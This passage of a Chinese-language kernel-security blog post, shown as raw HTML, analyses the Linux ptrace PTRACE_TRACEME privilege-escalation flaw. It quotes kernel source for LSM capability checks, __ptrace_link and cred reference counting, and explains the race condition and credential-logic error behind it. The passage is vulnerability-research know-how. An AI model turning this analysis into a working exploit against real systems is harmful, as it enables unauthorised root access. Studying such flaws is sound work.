class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] =</span> &#123;</span><br><span class="line">LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),</span><br><span class="line">LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">capability_add_hooks</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></figure><p>这里 <code>security_add_hooks()</code> 函数定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">security_add_hooks</span><span class="params">(<span class="keyword">struct</span> security_hook_list *hooks,</span></span><br><span class="line"><span class="params">      <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">list_add_tail_rcu(&amp;hooks[i].<span class="built_in">list</span>, hooks[i].head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里整个逻辑就一目了然了，该函数表会根据表 <code>capability_hooks</code> 进行对应的初始化操作</p><h3 id="ptracer-权限检查"><a href="#ptracer-权限检查" class="headerlink" title="ptracer 权限检查"></a>ptracer 权限检查</h3><p>现在让我们将目光放回 <code>security_bprm_set_creds()</code>函数，我们现在可以知道其调用的应当是 <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>，这个钩子指向函数 <code>cap_bprm_set_creds</code>，该函数定义于<code>/security/commoncap.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cap_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> current_cred();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> bprm-&gt;cred;</span><br><span class="line"><span class="type">bool</span> effective, has_cap = <span class="literal">false</span>, is_setid;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"><span class="type">kuid_t</span> root_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 笔者注：对被 ptrace 的 suid/sgid 进程进行权限检查</span></span><br><span class="line">    <span class="comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment"> * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((is_setid || <span class="comment">// 是否为 suid/sgid</span></span><br><span class="line">     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;</span><br><span class="line">    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||</span><br><span class="line">     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="comment">// 是否被 ptrace，若是，检查是否越权</span></span><br><span class="line"><span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">        <span class="comment">//若检查出越权，则重新进行一次检查，进行降权</span></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">new-&gt;euid = new-&gt;uid;</span><br><span class="line">new-&gt;egid = new-&gt;gid;</span><br><span class="line">&#125;</span><br><span class="line">new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,</span><br><span class="line">   old-&gt;cap_permitted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new-&gt;suid = new-&gt;fsuid = new-&gt;euid;</span><br><span class="line">new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>其中 <code>ptracer_capable()</code> 定义于 <code>/kernel/capability.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span></span><br><span class="line"><span class="comment"> * @tsk: The task that may be ptraced</span></span><br><span class="line"><span class="comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span></span><br><span class="line"><span class="comment"> * in the specified user namespace.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ptracer_capable</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> user_namespace *ns)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line"><span class="keyword">if</span> (cred)</span><br><span class="line">ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数检查了进程的 <code>ptracer_cred</code> 字段，若不为 NULL 则说明该进程为 ptracee，接下来使用 <code>security_capable_noaudit</code> 函数进行检查，该函数也是一个 LSM 钩子的 API，对应调用 <code>security_hook_heads-&gt;capable-&gt;hook</code>，对应函数为 <code>cap_capable()</code>，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cap_capable - Determine whether a task has a particular effective capability</span></span><br><span class="line"><span class="comment"> * @cred: The credentials to use</span></span><br><span class="line"><span class="comment"> * @ns:  The user namespace in which we need the capability</span></span><br><span class="line"><span class="comment"> * @cap: The capability to check for</span></span><br><span class="line"><span class="comment"> * @audit: Whether to write an audit message or not</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Determine whether the nominated task has the specified capability amongst</span></span><br><span class="line"><span class="comment"> * its effective set, returning 0 if it does, -ve if it does not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span></span><br><span class="line"><span class="comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span></span><br><span class="line"><span class="comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span></span><br><span class="line"><span class="comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cap_capable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *cred, <span class="keyword">struct</span> user_namespace *targ_ns,</span></span><br><span class="line"><span class="params"><span class="type">int</span> cap, <span class="type">int</span> audit)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> targ_ns;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* See if cred has the capability in the target user namespace</span></span><br><span class="line"><span class="comment"> * by examining the target user namespace and all of the target</span></span><br><span class="line"><span class="comment"> * user namespace&#x27;s parents.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/* Do we have the necessary capabilities? */</span></span><br><span class="line">        <span class="comment">// 若与 ptracer 同属同一命名空间，检查权限是否足够</span></span><br><span class="line"><span class="keyword">if</span> (ns == cred-&gt;user_ns)</span><br><span class="line"><span class="keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="number">0</span> : -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Have we tried all of the parent namespaces? */</span></span><br><span class="line">        <span class="comment">// 自底向上遍历完了，说明检查出错，返回对应错误值</span></span><br><span class="line"><span class="keyword">if</span> (ns == &amp;init_user_ns)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * The owner of the user namespace in the parent of the</span></span><br><span class="line"><span class="comment"> * user namespace has all caps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 我们主要关注这里，这里会检查 ptracer_cred 的命名空间是否是新进程命名空间的父命名空间</span></span><br><span class="line">        <span class="comment">// 若是，检查是否新进程命名空间的所有者是否与 ptracer 为同一用户</span></span><br><span class="line">        <span class="comment">// 若是，返回 0，说明通过检查</span></span><br><span class="line">        <span class="comment">// 若否，向上遍历命名空间，回到开头</span></span><br><span class="line"><span class="keyword">if</span> ((ns-&gt;parent == cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If you have a capability in a parent user ns, then you have</span></span><br><span class="line"><span class="comment"> * it over all children user namespaces as well.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ns = ns-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We never get here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会检查 ptracee 的命名空间所有者是否与 ptracer 为同一用户，<strong>只有这两者同属同一用户，检查才能通过，否则检查将不会通过，从而导致降权</strong></p><p>接下来的判断语句中调用的 <code>ns_capable()</code> 函数最终也会走到这个路径，这里便不再赘叙，感兴趣的可以自行检索阅读如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ns_capable()</span><br><span class="line">ns_capable_common()</span><br><span class="line">        security_capable()</span><br><span class="line">            cap_capable()</span><br></pre></td></tr></table></figure><p>由此我们得到结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p><h2 id="LSM-与-ptracer-权限检查"><a href="#LSM-与-ptracer-权限检查" class="headerlink" title="LSM 与 ptracer 权限检查"></a>LSM 与 ptracer 权限检查</h2><p>前面我们讲了对 ptracee 执行新程序的权限检查，现在我们来看对于 ptracer 操作的检查</p><p>将目光放回 ptrace 系统调用的源码中，对于 ptracer 的 <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> 这几个操作，会走入如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    arch_ptrace()</span><br><span class="line">    ptrace_request()</span><br><span class="line">    generic_ptrace_peekdata() / generic_ptrace_pokedata()</span><br><span class="line">    ptrace_access_vm()</span><br><span class="line">    ptracer_capable()</span><br><span class="line">    security_capable_noaudit()</span><br></pre></td></tr></table></figure><p>这里就又走回我们上面的路径了，不再重复分析，这里简单说明一点就是在 <code>ptrace_request()</code> 中传给下层被调函数的 task 参数为 ptracee 的 task_struct，在 <code>ptrace_access_vm()</code> 中传入的命名空间也为 ptracee 的 mm 的命名空间，因此<strong>最后权限判断还是根据 ptracee 进程的</strong> <code>ptracer_cred</code> <strong>字段</strong></p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>细心的读者或许已经观察到了，前面我们的预备知识中缺少了<strong>设置 ptracee 的 ptracer_cred 字段</strong>这一过程，实际上<strong>我们的漏洞便是出现在这个位置</strong></p><p>我们将目光重新放回 ptrace 系统调用的源码当中，当 ptracee 进程调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> 时，会走到如下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    ptrace_traceme()</span><br><span class="line">    __ptrace_link()</span><br></pre></td></tr></table></figure><p>其中 <code>__ptrace_link()</code> 函数<strong>就是本次出现漏洞的函数</strong>，该函数用于建立 ptrace link，定义于 <code>/kernel/ptrace.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace a task: make the debugger its new parent and</span></span><br><span class="line"><span class="comment"> * move it to the ptrace list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Must be called with the tasklist lock write-held.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __ptrace_link(<span class="keyword">struct</span> task_struct *child, <span class="keyword">struct</span> task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);</span><br><span class="line">child-&gt;parent = new_parent;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的功能比较简单，主要就是在 rcu 机制下将子进程的 <code>ptracer_cred</code> 字段设为<strong>父进程的 cred</strong>，这里的 <code>__task_cred()</code> 宏的作用主要是 rcu 机制下取得进程 real_cred，而 <code>get_cred()</code> 函数主要是将 cred 的引用计数 + 1</p><blockquote><p>RCU 机制即 ready-copy update ，该机制确保了多线程下读与写的同步，这里不详细介绍，原理可以简单理解为“节点更新”——读无限制，要写时先新建节点写入新节点，随后将节点更新到指针，这个过程中读者读的都是旧节点，随后等待读者退出，释放旧节点，新节点投入使用</p></blockquote><p>按照  Jann Horn 的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> 阐述，在这里存在着<strong>两个问题</strong>：</p><ul><li>竞态条件下导致错误的引用计数</li><li>ptracer_cred 设置的逻辑错误导致本地提权</li></ul><p>下面我们来逐一分析</p><h2 id="竞态条件下导致错误的引用计数"><a href="#竞态条件下导致错误的引用计数" class="headerlink" title="竞态条件下导致错误的引用计数"></a>竞态条件下导致错误的引用计数</h2><p>在 <code>__ptrace_link()</code> 函数中调用了 <code>get_cred()</code> 函数获取父进程的 cred，该函数会将其引用计数 + 1，这看起来<strong>好像没有什么问题</strong>，不是么？我们引用了父进程的 cred，自然引用计数要 + 1，当 ptrace 流程结束后，引用计数再 - 1，这一切看起来似乎很正常</p><p>咋一看这个流程设计似乎是没有问题的，但在竞态条件下就不一定了，我们现在将目光放到一个对于 kernel pwner 而言或许都很熟悉但不一定曾深入研究过的一个函数——<code>commit_creds</code>，该函数定义于 <code>kernel/cred.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数末尾会两次调用 <code>put_cred()</code> 函数，该函数定义于 <code>/include/linux/cred.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_cred</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *_cred)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> (<span class="keyword">struct</span> cred *) _cred;</span><br><span class="line"></span><br><span class="line">validate_creds(cred);</span><br><span class="line"><span class="keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))</span><br><span class="line">__put_cred(cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其功能比较简单，一是调用 <code>validate_cred()</code> 验证 cred 是否合法，随后使用 <code>atomic_dec_and_test</code> 宏将 cred 的引用计数减一，并确认其引用计数是否为 0，若为 0 则调用 <code>__put_cred()</code></p><p>通常来说，在 commit_creds 两次减去引用计数（cred 一次，real_cred 一次）后最终执行流都会走到 <code>__put_cred()</code>，该函数定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __put_cred - Destroy a set of credentials</span></span><br><span class="line"><span class="comment"> * @cred: The record to release</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Destroy a set of credentials on which no references remain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *cred)</span><br><span class="line">&#123;</span><br><span class="line">kdebug(<span class="string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,</span><br><span class="line">       <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">       read_cred_subscribers(cred));</span><br><span class="line"></span><br><span class="line">BUG_ON(<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(cred) != <span class="number">0</span>);</span><br><span class="line">cred-&gt;magic = CRED_MAGIC_DEAD;</span><br><span class="line">cred-&gt;put_addr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">BUG_ON(cred == current-&gt;cred);</span><br><span class="line">BUG_ON(cred == current-&gt;real_cred);</span><br><span class="line"></span><br><span class="line">call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看到其一开始先验证 cred 的引用计数，随后调用 <code>call_rcu()</code>，该函数的作用可以简单理解为在 rcu 机制下调用函数指针，这里调用的是 <code>put_cred_rcu()</code> 函数，定义于 <code>/kernel/cred.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The RCU callback to actually dispose of a set of credentials</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cred_rcu</span><span class="params">(<span class="keyword">struct</span> rcu_head *rcu)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> container_of(rcu, <span class="keyword">struct</span> cred, rcu);</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;put_cred_rcu(%p)&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||</span><br><span class="line">    <span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span> ||</span><br><span class="line">    read_cred_subscribers(cred) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span></span><br><span class="line">      <span class="string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,</span><br><span class="line">      cred, cred-&gt;magic, cred-&gt;put_addr,</span><br><span class="line">      <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">      read_cred_subscribers(cred));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,</span><br><span class="line">      cred, <span class="type">atomic_read</span>(&amp;cred-&gt;usage));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">security_cred_free(cred);</span><br><span class="line">key_put(cred-&gt;session_keyring);</span><br><span class="line">key_put(cred-&gt;process_keyring);</span><br><span class="line">key_put(cred-&gt;thread_keyring);</span><br><span class="line">key_put(cred-&gt;request_key_auth);</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;group_info)</span><br><span class="line">put_group_info(cred-&gt;group_info);</span><br><span class="line">free_uid(cred-&gt;user);</span><br><span class="line">put_user_ns(cred-&gt;user_ns);</span><br><span class="line">kmem_cache_free(cred_jar, cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见其会判断 cred 的引用计数是否为 0，<strong>若不为 0 则会导致 kernel panic</strong>，在正常情况下则是常规的将 cred 释放回 cred_jar 这一 slub 